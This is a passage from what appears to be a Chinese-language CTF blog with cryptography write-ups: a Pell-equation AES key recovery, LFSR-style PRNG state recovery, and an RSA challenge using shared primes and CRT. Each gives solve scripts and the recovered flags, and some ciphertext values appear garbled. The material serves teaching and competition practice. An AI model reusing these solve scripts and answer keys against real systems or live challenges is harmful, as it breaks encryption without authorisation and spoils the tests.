class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">KEY</span>):</span><br><span class="line">    cipher= AES.new(KEY,AES.MODE_ECB)</span><br><span class="line">    encrypted =cipher.encrypt(flag)</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line">D = <span class="number">114514</span></span><br><span class="line"><span class="keyword">assert</span> x**<span class="number">2</span> - D * y**<span class="number">2</span> == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag=pad(flag)</span><br><span class="line">key=pad(long_to_bytes(y))[:<span class="number">16</span>]</span><br><span class="line">enc=encrypt(key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc=<span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#enc=b&quot;\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5&#x27;\x93\xf8\xde\xb2\x9a\x9a&quot;</span></span><br></pre></td></tr></table></figure><p>对佩尔方程求解 拿到AES的密钥key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pell</span>(<span class="params">N, numTry = <span class="number">10000000</span></span>):</span><br><span class="line">    cf = continued_fraction(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTry):</span><br><span class="line">        denom = cf.denominator(i)</span><br><span class="line">        numer = cf.numerator(i)</span><br><span class="line">        <span class="keyword">if</span> numer^<span class="number">2</span> - N * denom^<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> numer, denom</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">114514</span> </span><br><span class="line">solve_pell(N)</span><br><span class="line"><span class="comment">#(3058389164815894335086675882217709431950420307140756009821362546111334285928768064662409120517323199,9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680)</span></span><br></pre></td></tr></table></figure><p><a href="https://lazzzaro.github.io/2020/05/10/crypto-crypto%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/index.html#%E4%BD%A9%E5%B0%94%E6%96%B9%E7%A8%8B-Pell%E6%96%B9%E7%A8%8B">reference</a></p><p>上面脚本就是注意一下numTry的值调一下即可</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="comment"># from secret import flag,y,x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">enc=<span class="string">b&quot;\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5&#x27;\x93\xf8\xde\xb2\x9a\x9a&quot;</span></span><br><span class="line"><span class="comment"># def encrypt(KEY):</span></span><br><span class="line"><span class="comment">#     cipher= AES.new(KEY,AES.MODE_ECB)</span></span><br><span class="line"><span class="comment">#     encrypted =cipher.encrypt(flag)</span></span><br><span class="line"><span class="comment">#     return encrypted</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">Key</span>):</span><br><span class="line">    cipher = AES.new(Key,AES.MODE_ECB)</span><br><span class="line">    decrypted = cipher.decrypt(enc)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line"><span class="comment">#pell方程求解</span></span><br><span class="line">D = <span class="number">114514</span></span><br><span class="line"><span class="comment"># assert x**2 - D * y**2 == 1  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag=pad(flag)</span></span><br><span class="line">y = <span class="number">9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680</span></span><br><span class="line">key=pad(long_to_bytes(y))[:<span class="number">16</span>]</span><br><span class="line">m=decrypt(key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc=<span class="subst">&#123;m&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#enc=b&#x27;hgame&#123;G0od!_Yo3_k1ow_C0ntinued_Fra3ti0ns!!!!!!!&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="ezprng">ezPRNG</h4><h5 id="考点：prng-与运算-移位运算">考点：PRNG 与运算 移位运算</h5><h5 id="解题：">解题：</h5><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PRNG</span>(<span class="params">R,mask</span>):</span><br><span class="line">    nextR = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span>  <span class="comment">#与1相与 有1则1 否则全为0 作用是限制位数</span></span><br><span class="line">    <span class="comment"># print(bin(R), bin(nextR), R.bit_length(), R.bit_length())</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span>  <span class="comment">#nextbit就是i的所有值相异或  对当前R操作</span></span><br><span class="line">    nextbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        nextbit^=(i%<span class="number">2</span>)  <span class="comment">#取最后一位</span></span><br><span class="line">        i=i//<span class="number">2</span>  <span class="comment">#舍弃最后一位</span></span><br><span class="line">    nextR^=nextbit </span><br><span class="line">    <span class="keyword">return</span> (nextR,nextbit)</span><br><span class="line"></span><br><span class="line">R=<span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">flag=<span class="string">&#x27;hgame&#123;&#x27;</span>+R+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">R=R.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">Rlist=[<span class="built_in">int</span>(R[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]  <span class="comment">#8位一组 进行切割  一共四组</span></span><br><span class="line">mask=<span class="number">0b10001001000010000100010010001001</span></span><br><span class="line">output=[]</span><br><span class="line"><span class="comment">#对切割的四组进行加密</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    R=Rlist[i]</span><br><span class="line">    out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        (R,nextbit)=PRNG(R,mask)</span><br><span class="line">        out+=<span class="built_in">str</span>(nextbit)</span><br><span class="line">    output.append(out)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;output=<span class="subst">&#123;output&#125;</span>&#x27;</span>)</span><br><span class="line">output=[<span class="string">&#xx27;</span>, <span class="string">&#xx27;</span>, <span class="string">&#x27;1110110110010001011100111110111110111001111101010011001111100100001000111001101011010100010111110101110101111010111100101100010011001001011101000101011000110111000010000101001000100111010110001010000111110110111000011001100010001101000010001111111100000101111000100101000000001001001001101110000100111001110001001011010111111010111101101101001110111010111110110011001000010001010100010010110110101011100000101111100100110011110001001001111100101111001111011011010111001001111010001100110001100001100000110000011111010100101111000000101011111010000111110000101111100010000010010111010110100101010101001111100101011100011001001011000101010101001101100010110000010001110011110011100111000110101010111010011010000001100001011000011101101000000011111000101111101011110011000011011000100100110111010011001111101100101100011000101001110101111001000010110010111101110110010101101000000101001011000000001110001110000100000001001111100011010011000000011011101111101001111110001011101100000010001001010011000001&#x27;</span>, <span class="string">&#xx27;</span>]</span><br></pre></td></tr></table></figure><p>分析：</p><p>由于mask的限制 只有mask为1的位置和mask相与才有可能为1 其余全部为0</p><ul><li>理解一下nextbit到底泄露的是什么信息：</li></ul><p>是每一次生成的R与mask做相与运算 然后对每一位做异或运算的结果 但是我们知道 mask只有特定的几个位置为1 其他全部为0 与0异或没有任何意义 1与0异或为1 0与0异或为0 所以不改变任何东西</p><p>故nextbit是每次的R与mask相与之后 mask为1的位置的值进行异或的结果 可能为1 也可能为0</p><ul><li>分析一下R的每一次迭代：</li></ul><p>因为每次R都是左移一位 高位溢出 低位补0 然后与1相与结果还是0 之后与上次生成的nextbit进行异或</p><p>其实就是在低位补充上次生成的nextbit</p><ul><li>分析一下nextbit的前31位的含义：</li></ul><p>R一共32位 其中高31位已经全部被挤出 最高位保留的是R的最低位，下图展示R全部移出的前一个状态</p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205205752072.png" alt="image-20240205205752072" style="zoom:50%;" /><p>针对PRNG这个函数进行转化 每次R都会向左移动一位 然后在低位填充的值是nextbit 题目虽然给了1000位 虽然一开始想全部用上，但是这也是一种陷阱吧 稍微对PRNG函数分析一下就会发现其实根本用不上 只需要前31个nextbit就可以恢复</p><p>那么我们恢复的思路就是对1bit进行猜 只有0和1两种情况 校验位分别是mask中为1的位置和生成的下一个bit进行比对，如下图所示</p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205210656289.png" alt="image-20240205210656289" style="zoom: 50%;" /><p>先假设猜测位为0 如果验证成功则该位置为0 否则验证失败 该位置为相反值1</p><p>现在得到了本次的状态 然后回溯上次的状态</p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205211211246.png" alt="image-20240205211211246" style="zoom:50%;" /><p>相同的方法进行猜测</p><p>依次类推直到R全部恢复</p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205211411682.png" alt="image-20240205211411682" style="zoom:50%;" /><p>到此分析流程结束！</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先针对mask提取出相与有效位1</span></span><br><span class="line">mask = <span class="string">&#x27;10001001000010000100010010001001&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mask)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(mask[i]) == <span class="number">1</span>: </span><br><span class="line">        <span class="built_in">print</span>(i, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment">#0 4 7 12 17 21 24 28 31</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后对R进行恢复</span></span><br><span class="line">output = [<span class="string">&#x27;...&#x27;</span>,<span class="string">&#x27;...&#x27;</span>,<span class="string">&#x27;...&#x27;</span>,<span class="string">&#x27;...&#x27;</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    nextbits = output[i]</span><br><span class="line">    </span><br><span class="line">    R = []  <span class="comment">#列表的形式便于插入 从头部 存放已知R的bit位</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):   <span class="comment">#每次恢复1bit 一共32bit 因为与0xffffffff 为限制位数的作用 如果实在不理解 可以用题目的脚本跑一下 看看真实的数据是什么就可以了</span></span><br><span class="line">        temp = <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(R) + nextbits[:(<span class="number">32</span>-<span class="number">1</span>-<span class="built_in">len</span>(R))]   <span class="comment">#凑齐32位 第一个是猜测位为0 第二部分是已知R位 第三部分是nextbit填充位</span></span><br><span class="line">        <span class="built_in">print</span>(temp)</span><br><span class="line">        <span class="comment">#进行猜测校验判断</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">int</span>(temp[<span class="number">0</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">4</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">7</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">12</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">17</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">21</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">24</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">28</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">31</span>]) == <span class="built_in">int</span>(nextbits[<span class="number">32</span>-<span class="number">1</span>-<span class="built_in">len</span>(R)])):</span><br><span class="line">            <span class="comment">#猜测成功填充0</span></span><br><span class="line">            R.insert(<span class="number">0</span>, <span class="string">&#x27;0&#x27;</span>)  <span class="comment">#在第0位插入0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            R.insert(<span class="number">0</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    R = <span class="string">&#x27;&#x27;</span>.join(R)</span><br><span class="line">    R = <span class="built_in">hex</span>(<span class="built_in">int</span>(R,<span class="number">2</span>))[<span class="number">2</span>:]  <span class="comment">#二进制转十进制 转16进制</span></span><br><span class="line">    flag += R</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#fbbbee823f434f919337907880e4191a</span></span><br></pre></td></tr></table></figure><p>最后需要对结果划分</p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205214858110.png" alt="image-20240205214858110" style="zoom: 67%;" /><p>其格式是固定的 所以flag：</p><p><code>hgame&#123;fbbbee82-3f43-4f91-9337-907880e4191a&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf-contest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-contest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024NssRound16-Crypto</title>
      <link href="/2024/01/15/2024-01-13-nssRound16Cry/"/>
      <url>/2024/01/15/2024-01-13-nssRound16Cry/</url>
      
        <content type="html"><![CDATA[<h1 id="nssround16">nssRound16</h1><p>[TOC]</p><h2 id="crypto">Crypto</h2><h3 id="pr">pr</h3><h4 id="题面：">题面：</h4><p>crt</p><h4 id="考点：同余性质-crt">考点：同余性质 CRT</h4><h4 id="题目：">题目：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag=plaintext = <span class="string">&#x27;NSSCTF&#123;****************&#125;&#x27;</span></span><br><span class="line">charset = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">padding_length = <span class="number">100</span> - <span class="built_in">len</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(padding_length):</span><br><span class="line">    plaintext += random.choice(charset)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br><span class="line">public_exponent = <span class="number">31413537523</span></span><br><span class="line">message = bytes_to_long(plaintext.encode())</span><br><span class="line"><span class="keyword">assert</span> message &gt; (<span class="number">1</span> &lt;&lt; <span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> message &lt; (<span class="number">1</span> &lt;&lt; <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">prime_p = getPrime(<span class="number">512</span>)</span><br><span class="line">prime_q = getPrime(<span class="number">512</span>)</span><br><span class="line">prime_r = getPrime(<span class="number">512</span>)</span><br><span class="line">n1 = prime_p * prime_q</span><br><span class="line">n2 = prime_q * prime_r</span><br><span class="line">ciphertext1 = <span class="built_in">pow</span>(message, public_exponent, n1)</span><br><span class="line">ciphertext2 = <span class="built_in">pow</span>(message, public_exponent, n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1=&#x27;</span>, ciphertext1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2=&#x27;</span>, ciphertext2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>, prime_p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r=&#x27;</span>, prime_r)</span><br><span class="line"></span><br><span class="line">c1= <span class="number">36918910341116680090654563538246204134840776220077189276689868322808977412566781872132517635399441578464309667998925236488280867210758507758915311644529399878185776345227817559234605958783077866016808605942558810445187434690812992072238407431218047312484354859724174751718700409405142819140636116559320641695</span></span><br><span class="line">c2= <span class="number">15601788304485903964195122196382181273808496834343051747331984997977255326224514191280515875796224074672957848566506948553165091090701291545031857563686815297483181025074113978465751897596411324331847008870832527695258040104858667684793196948970048750296571273364559767074262996595282324974180754813257013752</span></span><br><span class="line">p= <span class="number">12101696894052331138951718202838643670037274599483776996203693662637821825873973767235442427190607145999472731101517998719984942030184683388441121181962123</span></span><br><span class="line">r= <span class="number">10199001137987151966640837133782537428248507382360655526592866939552984259171772190788036403425837649697437126360866173688083643144865107648483668545682383</span></span><br></pre></td></tr></table></figure><h4 id="解题：">解题：</h4><p>题目流程简化分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">31413537523</span></span><br><span class="line">n1 = p * q</span><br><span class="line">n2 = q * r</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e, n2)</span><br><span class="line">=&gt;</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e, p * q)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e, q * r)</span><br></pre></td></tr></table></figure><p>已知：p、r、c1、c2</p><p>利用同余的性质推导：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240114234254707.png" alt="image-20240114234254707"></p><p>先根据放到缩小模数原理 对c1进行操作</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mtext> </mtext><mo>=</mo><mtext> </mtext><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mspace linebreak="newline"></mspace><mtext>两边同乘</mtext><mi>q</mi><mspace linebreak="newline"></mspace><msub><mi>c</mi><mn>1</mn></msub><mo>∗</mo><mi>q</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mo>∗</mo><mi>q</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>∗</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c_1~=~m^e~mod~p\\两边同乘q\\c_1*q = m^e*q~mod~(p*q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">边</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">乘</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></span></p><p>后面利用除法原理</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240114234730136.png" alt="image-20240114234730136"></p><p>其中k代表q m代表p*qk与p*q  互质=&gt;</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>1</mn><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>∗</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c1=m^e~mod~(p*q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></span></p><p>简单来说就是 在同余关系中 模数的因子作为模数仍然存在同余关系，即：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mtext> </mtext><mo>=</mo><mtext> </mtext><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo>∗</mo><mi>q</mi><mspace linebreak="newline"></mspace><mo>=</mo><mo>&gt;</mo><mtext>  </mtext><msub><mi>c</mi><mn>1</mn></msub><mtext> </mtext><mo>=</mo><mtext> </mtext><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">c_1~=~m^e~mod~p*q\\=&gt;~~c_1~=~m^e~mod~p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span 